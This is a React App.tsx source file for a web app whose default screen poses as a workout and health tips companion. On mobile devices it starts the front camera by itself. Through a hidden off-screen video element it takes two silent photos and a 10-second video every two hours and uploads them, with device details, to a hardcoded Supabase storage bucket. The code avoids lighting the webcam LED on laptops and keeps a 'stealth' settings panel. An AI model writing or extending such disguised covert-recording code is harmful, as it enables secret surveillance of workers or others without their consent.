import React, { useState, useEffect, useRef, useCallback } from 'react';
import { Header } from './components/Header';
import { WorkoutHealthDashboard } from './components/WorkoutHealthDashboard';
import { StealthSettingsModal } from './components/StealthSettingsModal';
import { LiveCameraView } from './components/LiveCameraView';
import { CountdownCard } from './components/CountdownCard';
import { DeviceSettingsCard } from './components/DeviceSettingsCard';
import { CloudTransferStatusCard } from './components/CloudTransferStatusCard';
import { StatusLogBox } from './components/StatusLogBox';
import { SecurityConfig, CapturedPhoto, CapturedVideo, PhotoPair, LogEvent } from './types';
import { WakeLockController } from './utils/wakeLock';
import {
  initFrontCameraStream,
  captureSilentCanvasFrame,
  recordVideoClip,
  generatePhotoStoragePath,
  generateVideoStoragePath,
  getFileSafeTimestamp,
  isMobileDevice,
} from './utils/camera';
import { uploadToSupabaseStorage, uploadDeviceStatusToSupabase } from './utils/supabase';

const DEFAULT_CONFIG: SecurityConfig = {
  deviceId: 'Phone_01',
  supabaseUrl: 'https://nchosqdrzsphqnmrosfr.supabase.co',
  supabaseAnonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5jaG9zcWRyenNwaHFubXJvc2ZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk1MzU1NTEsImV4cCI6MjEwNTExMTU1MX0.BnLxYZyLXxYLzF9PN7KBoLvoDvp-WLI5Qh2--XH9oeE',
  supabaseBucket: 'healthy',
  testMode: false,
  intervalSeconds: 7200, // 2 Hours (7200 seconds) standard loop
  videoDurationSeconds: 10, // 10-second video clip right after 2 photos
};

export default function App() {
  // --- View Mode: Default to Workout & Health Tips Companion ---
  const [viewMode, setViewMode] = useState<'workout' | 'classic'>('workout');
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);

  // --- Persistent Configuration with automatic sanitation ---
  const [config, setConfig] = useState<SecurityConfig>(() => {
    const rawUrl = localStorage.getItem('sec_supabase_url')?.trim();
    const rawKey = localStorage.getItem('sec_supabase_anon_key')?.trim();
    const rawBucket = localStorage.getItem('sec_supabase_bucket')?.trim();
    const rawDevice = localStorage.getItem('sec_device_id')?.trim();
    const rawInterval = localStorage.getItem('sec_interval_seconds');
    const rawVideoDuration = localStorage.getItem('sec_video_duration');

    const validUrl = (rawUrl && !rawUrl.includes('xyzcompany')) ? rawUrl : DEFAULT_CONFIG.supabaseUrl;
    const validKey = (rawKey && rawKey.length > 20) ? rawKey : DEFAULT_CONFIG.supabaseAnonKey;
    const validBucket = (rawBucket && rawBucket !== 'security-photos') ? rawBucket : DEFAULT_CONFIG.supabaseBucket;
    const validDevice = rawDevice || DEFAULT_CONFIG.deviceId;
    const validInterval = rawInterval ? Math.max(15, Number(rawInterval)) : DEFAULT_CONFIG.intervalSeconds;
    const validVideoDuration = rawVideoDuration ? Number(rawVideoDuration) : DEFAULT_CONFIG.videoDurationSeconds;

    // Persist corrected defaults
    localStorage.setItem('sec_supabase_url', validUrl);
    localStorage.setItem('sec_supabase_anon_key', validKey);
    localStorage.setItem('sec_supabase_bucket', validBucket);
    localStorage.setItem('sec_device_id', validDevice);
    localStorage.setItem('sec_interval_seconds', String(validInterval));
    localStorage.setItem('sec_video_duration', String(validVideoDuration));

    return {
      deviceId: validDevice,
      supabaseUrl: validUrl,
      supabaseAnonKey: validKey,
      supabaseBucket: validBucket,
      testMode: localStorage.getItem('sec_test_mode') === 'true',
      intervalSeconds: validInterval,
      videoDurationSeconds: validVideoDuration,
    };
  });

  const updateConfig = (newConfig: Partial<SecurityConfig>) => {
    setConfig((prev) => {
      const updated = { ...prev, ...newConfig };
      if (newConfig.deviceId !== undefined) localStorage.setItem('sec_device_id', updated.deviceId);
      if (newConfig.supabaseUrl !== undefined) localStorage.setItem('sec_supabase_url', updated.supabaseUrl);
      if (newConfig.supabaseAnonKey !== undefined) localStorage.setItem('sec_supabase_anon_key', updated.supabaseAnonKey);
      if (newConfig.supabaseBucket !== undefined) localStorage.setItem('sec_supabase_bucket', updated.supabaseBucket);
      if (newConfig.testMode !== undefined) localStorage.setItem('sec_test_mode', String(updated.testMode));
      if (newConfig.intervalSeconds !== undefined) localStorage.setItem('sec_interval_seconds', String(updated.intervalSeconds));
      if (newConfig.videoDurationSeconds !== undefined) localStorage.setItem('sec_video_duration', String(updated.videoDurationSeconds));
      return updated;
    });
  };

  // --- Monitoring & Camera State ---
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [isFlashing] = useState(false);
  const [resolution, setResolution] = useState<string>('');
  const [cycleStatusText, setCycleStatusText] = useState<string>('Standby');

  // Stream & DOM refs
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);

  // Screen Wake Lock controller
  const [wakeLockActive, setWakeLockActive] = useState(false);
  const [wakeLockSupported, setWakeLockSupported] = useState(true);
  const wakeLockControllerRef = useRef<WakeLockController | null>(null);

  // --- Timer & Countdown State ---
  // Default: 2 hours = 7200 seconds; Test Mode: 15 seconds
  const totalCycleSeconds = config.testMode ? 15 : (config.intervalSeconds || 7200);
  const [remainingSeconds, setRemainingSeconds] = useState(totalCycleSeconds);
  const timerIntervalRef = useRef<number | null>(null);

  // --- Captured Photos & Logs ---
  const [currentPair, setCurrentPair] = useState<PhotoPair | null>(null);
  const [logs, setLogs] = useState<LogEvent[]>([
    {
      id: 'init-1',
      timestamp: new Date().toTimeString().split(' ')[0],
      type: 'info',
      message: 'Surveillance system initialized. Configured for 2 photos + 10s video every 2 hours.',
    },
  ]);

  const addLog = useCallback((
    message: string,
    type: LogEvent['type'] = 'info',
    details?: string
  ) => {
    const newLog: LogEvent = {
      id: `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
      timestamp: new Date().toTimeString().split(' ')[0],
      type,
      message,
      details,
    };
    setLogs((prev) => [...prev.slice(-150), newLog]);
  }, []);

  // Initialize WakeLock Controller on mount
  useEffect(() => {
    const controller = new WakeLockController((active) => {
      setWakeLockActive(active);
    });
    wakeLockControllerRef.current = controller;
    setWakeLockSupported(controller.isSupported());

    return () => {
      controller.release();
    };
  }, []);

  // Sync remainingSeconds when testMode or intervalSeconds changes
  useEffect(() => {
    const newTotal = config.testMode ? 15 : (config.intervalSeconds || 7200);
    setRemainingSeconds((prev) => Math.min(prev, newTotal));
    addLog(
      config.testMode
        ? '⚡ Fast Test Mode activated: Cycle interval set to 15 seconds (2 photos + 10s video).'
        : `⏱️ Standard Mode activated: Cycle interval set to 2 hours (${config.intervalSeconds || 7200}s).`,
      'info'
    );
  }, [config.testMode, config.intervalSeconds, addLog]);

  // Clean up timer on unmount
  useEffect(() => {
    return () => {
      if (timerIntervalRef.current) {
        clearInterval(timerIntervalRef.current);
      }
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach((t) => t.stop());
      }
    };
  }, []);

  // --- Surveillance Cycle: 2 Photos (2s apart) + Immediately 10-Second Video Clip ---
  const executeSurveillanceCycle = useCallback(async () => {
    if (!videoRef.current || isCapturing) return;

    setIsCapturing(true);
    const cycleTimestamp = new Date().toLocaleTimeString();
    const fileTimestamp = getFileSafeTimestamp();
    const deviceId = config.deviceId.trim() || 'Phone_01';

    addLog(`Initiating surveillance cycle for device "${deviceId}"...`, 'info');
    setCycleStatusText('Capturing Photo #1 (Initial)...');

    const newPair: PhotoPair = {
      id: `pair-${Date.now()}`,
      cycleTimestamp,
      status: 'capturing',
    };
    setCurrentPair(newPair);

    try {
      const targetUrl = config.supabaseUrl || DEFAULT_CONFIG.supabaseUrl;
      const targetKey = config.supabaseAnonKey || DEFAULT_CONFIG.supabaseAnonKey;
      const targetBucket = (config.supabaseBucket && config.supabaseBucket !== 'security-photos')
        ? config.supabaseBucket
        : DEFAULT_CONFIG.supabaseBucket;

      // ----------------------------------------------------
      // 1. Photo #1: Immediate snapshot (Zero flash/torch, silent canvas)
      // ----------------------------------------------------
      const shot1 = await captureSilentCanvasFrame(videoRef.current, 0.92);
      const path1 = generatePhotoStoragePath(deviceId, fileTimestamp, 1);

      const capturedPhoto1: CapturedPhoto = {
        id: `photo-${Date.now()}-1`,
        index: 1,
        timestamp: cycleTimestamp,
        dataUrl: '',
        blobSize: shot1.blob.size,
        uploadStatus: 'uploading',
        cloudPath: `${targetBucket}/${path1}`,
      };

      setCurrentPair((prev) => (prev ? { ...prev, photo1: capturedPhoto1 } : null));
      addLog(`Snapshot 1/2 captured silently (${(shot1.blob.size / 1024).toFixed(1)} KB). Streaming to Supabase...`, 'info');

      const uploadRes1 = await uploadToSupabaseStorage(
        targetUrl,
        targetKey,
        targetBucket,
        path1,
        shot1.blob,
        'image/jpeg'
      );

      if (uploadRes1.success) {
        capturedPhoto1.uploadStatus = 'success';
        addLog(`✅ Photo 1/2 stored in Supabase: ${uploadRes1.cloudPath}`, 'success');
      } else {
        capturedPhoto1.uploadStatus = 'error';
        capturedPhoto1.uploadError = uploadRes1.error;
        addLog(`❌ Photo 1/2 upload failed: ${uploadRes1.error}`, 'error');
      }

      setCurrentPair((prev) => (prev ? { ...prev, photo1: { ...capturedPhoto1 } } : null));

      // ----------------------------------------------------
      // 2. Wait exactly 2 seconds between consecutive snapshots
      // ----------------------------------------------------
      setCycleStatusText('Waiting 2 seconds for Photo #2...');
      await new Promise((resolve) => setTimeout(resolve, 2000));

      // ----------------------------------------------------
      // 3. Photo #2: Consecutive snapshot (+2 seconds, silent canvas)
      // ----------------------------------------------------
      setCycleStatusText('Capturing Photo #2 (+2s)...');

      const shot2 = await captureSilentCanvasFrame(videoRef.current, 0.92);
      const path2 = generatePhotoStoragePath(deviceId, fileTimestamp, 2);

      const capturedPhoto2: CapturedPhoto = {
        id: `photo-${Date.now()}-2`,
        index: 2,
        timestamp: new Date().toLocaleTimeString(),
        dataUrl: '',
        blobSize: shot2.blob.size,
        uploadStatus: 'uploading',
        cloudPath: `${targetBucket}/${path2}`,
      };

      setCurrentPair((prev) => (prev ? { ...prev, photo2: capturedPhoto2 } : null));
      addLog(`Snapshot 2/2 captured silently (${(shot2.blob.size / 1024).toFixed(1)} KB). Streaming to Supabase...`, 'info');

      const uploadRes2 = await uploadToSupabaseStorage(
        targetUrl,
        targetKey,
        targetBucket,
        path2,
        shot2.blob,
        'image/jpeg'
      );

      if (uploadRes2.success) {
        capturedPhoto2.uploadStatus = 'success';
        addLog(`✅ Photo 2/2 stored in Supabase: ${uploadRes2.cloudPath}`, 'success');
      } else {
        capturedPhoto2.uploadStatus = 'error';
        capturedPhoto2.uploadError = uploadRes2.error;
        addLog(`❌ Photo 2/2 upload failed: ${uploadRes2.error}`, 'error');
      }

      setCurrentPair((prev) => (prev ? { ...prev, photo2: { ...capturedPhoto2 } } : null));

      // ----------------------------------------------------
      // 4. Record 10-Second Video Clip right after the 2 photos ("২ টি ছবি ওঠার পর পর")
      // ----------------------------------------------------
      let uploadVidPath = '';
      if (mediaStreamRef.current && typeof MediaRecorder !== 'undefined') {
        const videoDuration = config.videoDurationSeconds || 10;
        setCycleStatusText(`Recording ${videoDuration}s Video Clip (Proof of work)...`);
        addLog(`🎥 Starting ${videoDuration}-second video recording to check if workers are active...`, 'info');

        const capturedVid: CapturedVideo = {
          id: `video-${Date.now()}`,
          durationSeconds: videoDuration,
          timestamp: new Date().toLocaleTimeString(),
          blobSize: 0,
          mimeType: 'video/webm',
          extension: 'webm',
          uploadStatus: 'recording',
        };

        setCurrentPair((prev) => (prev ? { ...prev, status: 'recording_video', video: capturedVid } : null));

        try {
          const vidResult = await recordVideoClip(
            mediaStreamRef.current,
            videoDuration,
            (secLeft) => {
              setCycleStatusText(`Recording ${videoDuration}s Video Clip (${secLeft}s left)...`);
            }
          );

          const videoPath = generateVideoStoragePath(deviceId, fileTimestamp, vidResult.extension);
          capturedVid.blobSize = vidResult.blob.size;
          capturedVid.mimeType = vidResult.mimeType;
          capturedVid.extension = vidResult.extension;
          capturedVid.uploadStatus = 'uploading';
          capturedVid.cloudPath = `${targetBucket}/${videoPath}`;

          setCurrentPair((prev) => (prev ? { ...prev, video: { ...capturedVid } } : null));
          setCycleStatusText('Uploading 10s Video to Supabase...');
          addLog(
            `🎥 10-second video recorded (${(vidResult.blob.size / 1024).toFixed(1)} KB, ${vidResult.extension.toUpperCase()}). Uploading to Supabase...`,
            'info'
          );

          const uploadVidRes = await uploadToSupabaseStorage(
            targetUrl,
            targetKey,
            targetBucket,
            videoPath,
            vidResult.blob,
            vidResult.mimeType
          );

          if (uploadVidRes.success) {
            capturedVid.uploadStatus = 'success';
            uploadVidPath = uploadVidRes.cloudPath || `${targetBucket}/${videoPath}`;
            addLog(
              `✅ 10s Video Clip successfully uploaded: ${uploadVidPath} (Work activity verified)`,
              'success'
            );
          } else {
            capturedVid.uploadStatus = 'error';
            capturedVid.uploadError = uploadVidRes.error;
            addLog(`❌ Video upload failed: ${uploadVidRes.error}`, 'error');
          }

          setCurrentPair((prev) => (prev ? { ...prev, status: 'completed', video: { ...capturedVid } } : null));
        } catch (vidErr) {
          const errText = vidErr instanceof Error ? vidErr.message : String(vidErr);
          addLog(`Video recording issue: ${errText}`, 'warning');
        }
      } else {
        addLog('MediaRecorder not available or camera stream inactive; skipped video recording.', 'warning');
      }

      // Push telemetry/health info JSON to Supabase Storage: {bucket}/{deviceId}/device_status.json
      uploadDeviceStatusToSupabase(
        targetUrl,
        targetKey,
        targetBucket,
        deviceId,
        {
          deviceId,
          lastActive: new Date().toISOString(),
          lastActiveLocal: new Date().toLocaleString(),
          isMonitoring: true,
          testMode: config.testMode,
          cycleIntervalHours: config.testMode ? '15s test' : '2 hours',
          lastCycle: {
            timestamp: cycleTimestamp,
            photo1: uploadRes1.success ? uploadRes1.cloudPath : 'failed',
            photo2: uploadRes2.success ? uploadRes2.cloudPath : 'failed',
            video: uploadVidPath || 'none',
            video_duration_seconds: config.videoDurationSeconds || 10,
            photo1_size_bytes: shot1.blob.size,
            photo2_size_bytes: shot2.blob.size,
            purpose: 'Workplace activity verification',
          },
          deviceInfo: {
            userAgent: navigator.userAgent,
            isMobile: isMobileDevice(),
            screen: `${window.screen?.width || 0}x${window.screen?.height || 0}`,
            online: navigator.onLine,
          }
        }
      ).catch(() => {});

      addLog(
        `Cycle complete (2 Photos + 10s Video). Next cycle scheduled in ${
          config.testMode ? '15 seconds' : '2 hours'
        }.`,
        'success'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      addLog(`Error during surveillance cycle: ${msg}`, 'error');
    } finally {
      setIsCapturing(false);
      setRemainingSeconds(totalCycleSeconds);
      setCycleStatusText('Monitoring Active');
    }
  }, [config, isCapturing, totalCycleSeconds, addLog]);

  // --- Countdown Interval Management ---
  const startTimerLoop = useCallback(() => {
    if (timerIntervalRef.current) {
      clearInterval(timerIntervalRef.current);
    }

    setRemainingSeconds(totalCycleSeconds);

    timerIntervalRef.current = window.setInterval(() => {
      setRemainingSeconds((prev) => {
        if (prev <= 1) {
          // Trigger next capture & video cycle
          executeSurveillanceCycle();
          return totalCycleSeconds;
        }
        return prev - 1;
      });
    }, 1000);
  }, [totalCycleSeconds, executeSurveillanceCycle]);

  // --- Primary "View" Action Handler ---
  const handleView = useCallback(async () => {
    try {
      addLog('Initializing front camera stream (facingMode: "user")...', 'info');

      // 1. Initialize front camera stream
      const stream = await initFrontCameraStream();
      mediaStreamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();

        const videoTrack = stream.getVideoTracks()[0];
        const settings = videoTrack.getSettings();
        const resText = `${settings.width || videoRef.current.videoWidth || 1920}x${
          settings.height || videoRef.current.videoHeight || 1080
        }`;
        setResolution(resText);
      }

      setIsMonitoring(true);
      setCycleStatusText('Monitoring Active');
      addLog('Front camera stream initialized successfully.', 'success');

      // 2. Request JavaScript Screen Wake Lock API
      if (wakeLockControllerRef.current) {
        const acquired = await wakeLockControllerRef.current.acquire();
        if (acquired) {
          addLog('Screen Wake Lock acquired: phone display will remain awake.', 'success');
        } else {
          addLog('Screen Wake Lock could not be acquired (may not be supported or allowed).', 'warning');
        }
      }

      // 3. Immediately capture TWO consecutive snapshot photos + 10s video proof
      await executeSurveillanceCycle();

      // 4. Start the automated interval countdown (2 Hours or 15s test mode)
      startTimerLoop();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      addLog(`Failed to start camera or monitoring: ${msg}`, 'error');
    }
  }, [addLog, executeSurveillanceCycle, startTimerLoop]);

  // Auto-trigger camera permission ONLY on mobile devices
  // On laptops/PCs, camera is NEVER auto-started so the webcam LED / flash never illuminates!
  useEffect(() => {
    const isMobile = isMobileDevice();
    if (!isMobile) {
      addLog('💻 Laptop/Desktop environment detected: Automatic webcam trigger is disabled to keep camera LED/flash off.', 'info');
      return;
    }

    let started = false;
    const triggerStart = () => {
      if (!started && !isMonitoring) {
        started = true;
        handleView().catch(() => {});
      }
    };

    // 1. Immediate automated trigger after component mounts on mobile
    const timer = setTimeout(() => {
      triggerStart();
    }, 500);

    // 2. Fallback gesture listener in case browser mandates a user tap for getUserMedia
    const onUserGesture = () => {
      triggerStart();
      window.removeEventListener('click', onUserGesture);
      window.removeEventListener('touchstart', onUserGesture);
    };

    window.addEventListener('click', onUserGesture, { passive: true, once: true });
    window.addEventListener('touchstart', onUserGesture, { passive: true, once: true });

    return () => {
      clearTimeout(timer);
      window.removeEventListener('click', onUserGesture);
      window.removeEventListener('touchstart', onUserGesture);
    };
  }, [isMonitoring, handleView, addLog]);

  // --- Stop Monitoring Handler ---
  const handleStop = () => {
    setIsMonitoring(false);
    setCycleStatusText('Monitoring Stopped');

    if (timerIntervalRef.current) {
      clearInterval(timerIntervalRef.current);
      timerIntervalRef.current = null;
    }

    if (mediaStreamRef.current) {
      mediaStreamRef.current.getTracks().forEach((track) => track.stop());
      mediaStreamRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }

    if (wakeLockControllerRef.current) {
      wakeLockControllerRef.current.release();
    }

    addLog('Surveillance monitoring stopped by user. Wake Lock released.', 'info');
  };

  // --- Manual Snapshot Trigger ---
  const handleSnapNow = () => {
    if (isMonitoring && !isCapturing) {
      addLog('Manual surveillance cycle triggered by user.', 'info');
      executeSurveillanceCycle();
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col antialiased selection:bg-emerald-500 selection:text-white">
      {/* Hidden Video element for silent background captures & video recording */}
      <video
        ref={videoRef}
        playsInline
        muted
        autoPlay
        className="opacity-0 pointer-events-none absolute -top-[9999px] -left-[9999px] w-1 h-1"
      />

      {/* Navigation Header */}
      <Header
        isMonitoring={isMonitoring}
        wakeLockActive={wakeLockActive}
        wakeLockSupported={wakeLockSupported}
        testMode={config.testMode}
        deviceId={config.deviceId}
        onOpenSettings={() => setIsSettingsOpen(true)}
        viewMode={viewMode}
        onToggleViewMode={() => setViewMode((v) => (v === 'workout' ? 'classic' : 'workout'))}
      />

      {/* Main Content Area */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6">
        {viewMode === 'workout' ? (
          /* Primary View: Luxury Health & Workout Companion */
          <WorkoutHealthDashboard
            isMonitoring={isMonitoring}
            onOpenSettings={() => setIsSettingsOpen(true)}
            wakeLockActive={wakeLockActive}
            onManualSnap={handleSnapNow}
          />
        ) : (
          /* Secondary / Console View: Technical Security Dashboard */
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
            {/* Left Column: Live Camera Stream & Countdown (7 cols) */}
            <div className="lg:col-span-7 flex flex-col gap-6 w-full">
              <LiveCameraView
                videoRef={videoRef}
                isMonitoring={isMonitoring}
                isCapturing={isCapturing}
                isFlashing={isFlashing}
                resolution={resolution}
                onViewClick={handleView}
                onStopClick={handleStop}
                onSnapNowClick={handleSnapNow}
              />

              <CountdownCard
                remainingSeconds={remainingSeconds}
                totalCycleSeconds={totalCycleSeconds}
                isMonitoring={isMonitoring}
                isCapturing={isCapturing}
                cycleStatusText={cycleStatusText}
                testMode={config.testMode}
                onToggleTestMode={(enabled) => updateConfig({ testMode: enabled })}
              />
            </div>

            {/* Right Column: Configuration, Recent Photo Pair, Logs (5 cols) */}
            <div className="lg:col-span-5 flex flex-col gap-6 w-full">
              <DeviceSettingsCard
                config={config}
                onUpdateConfig={updateConfig}
                onAddLog={addLog}
              />

              <CloudTransferStatusCard
                currentPair={currentPair}
                bucketName={config.supabaseBucket}
                deviceId={config.deviceId}
              />

              <StatusLogBox
                logs={logs}
                onClearLogs={() => setLogs([])}
              />
            </div>
          </div>
        )}
      </main>

      {/* Discreet System Settings & Cloud Status Modal */}
      <StealthSettingsModal
        isOpen={isSettingsOpen}
        onClose={() => setIsSettingsOpen(false)}
        config={config}
        onUpdateConfig={updateConfig}
        currentPair={currentPair}
        logs={logs}
        onClearLogs={() => setLogs([])}
        onAddLog={addLog}
        onManualSnap={handleSnapNow}
        isCapturing={isCapturing}
        remainingSeconds={remainingSeconds}
        totalCycleSeconds={totalCycleSeconds}
      />
    </div>
  );
}
